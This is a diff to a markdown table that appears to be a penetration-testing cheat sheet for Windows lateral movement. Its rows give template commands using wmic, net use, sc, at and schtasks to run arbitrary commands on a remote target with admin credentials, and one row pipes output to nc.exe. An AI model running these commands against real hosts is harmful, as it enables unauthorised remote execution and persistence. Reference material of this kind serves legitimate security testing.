@@ -94,7 +94,8 @@ WMIC Kill Processes | wmic /node:[targetIP] /user:[admin_user] /password:[passwo
 WMIC Monitor Process | <code> wmic process where name="[name]" list brief /every:1 | "nc.exe" </code>
 at (windows 7 and lower)(all commands at SYSTEM) | <code> "net use \\[targetIP] [password] /u:[admin_user] <br> sc \\[targetIP] query schedule (*make sure it is running*) <br> *sc \\[targetIP] start schedule* <br> at [\\targetIP] [HH:MM] [A|P] [command] <br> at \\[machine] [time] cmd /c ""[command]"" <br> at \\[targetIP} (*check status*)" </code> 
 
-schtasksStart time - HH:MM:SSFrequency: MINUTE, HOURLY, DAILY, ONCE, ONSTART, ONLOGON, ONIDLE | <code> net use \\[targetIP] [password] /u:[admin_user] 
+schtasksStart time <br> <i> HH:MM:SSFrequency: MINUTE, HOURLY, DAILY, ONCE, ONSTART, ONLOGON, ONIDLE </i> | <code> net use \\[targetIP] [password] /u:[admin_user] 
+
 <br> sc \\[targetIP] query schedule (*make sure it is running*)
 <br> *sc \\[targetIP] start schedule*
 <br> schtasks /creat /tn [taskname] /s [targetIP] /u [user] /p [password] /sc [frequency]  /st [starttime] /sd [startdate] /tr [command]
